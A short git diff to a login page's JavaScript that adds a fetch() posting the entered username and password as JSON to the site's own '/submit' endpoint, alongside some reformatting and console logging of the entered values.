@@ -29,19 +29,29 @@ function closeBox() {
 }
 
 document.querySelector('form').addEventListener('submit', function (e) {
-    e.preventDefault(); // 阻止表單自動提交
+    e.preventDefault();
 
     const username = document.getElementById('username');
     const password = document.getElementById('password');
     const alert = document.getElementById("alert");
-    alert.style.display="block";
-    const con= document.getElementById("login-container");
-    con.style.height="52%";
+    alert.style.display = "block";
+    const con = document.getElementById("login-container");
+    con.style.height = "52%";
     console.log('帳號：', username.value);
     console.log('密碼：', password.value);
-    username.value="";
-    password.value="";
-    
 
-    // 可以用 fetch 或其他方式送出
+
+    fetch('/submit', {
+        method: 'POST',
+        body: JSON.stringify({
+            username: username.value,
+            password: password.value
+        }),
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    });
+    username.value = "";
+    password.value = "";
+
 });
